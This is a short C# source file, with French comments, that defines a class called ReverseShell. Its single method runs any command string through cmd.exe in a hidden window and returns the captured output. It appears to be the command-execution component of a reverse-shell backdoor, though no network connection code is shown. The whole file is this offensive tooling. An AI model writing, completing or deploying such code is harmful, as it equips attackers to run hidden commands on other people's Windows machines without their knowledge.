using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Threading;
using System.Text;

public class ReverseShell
{
    public string reverse_shell(string commande)
    {        
        Process cmd = new Process();
        cmd.StartInfo.FileName = "cmd.exe";
        cmd.StartInfo.Arguments = "/C " + commande;
        cmd.StartInfo.RedirectStandardOutput = true;
        cmd.StartInfo.CreateNoWindow = true;
        cmd.StartInfo.UseShellExecute = false;

        // Démarrer le processus
        cmd.Start();

        // Récupérer la sortie de la commande
        string output = cmd.StandardOutput.ReadToEnd();

        // Attendre la fin de l'exécution de la commande
        cmd.WaitForExit();

        if (output == ""){
            output = "Succès";
        }
        // Afficher la sortie de la 
        //Console.WriteLine("output:\n" + output);
        return output;
    }

}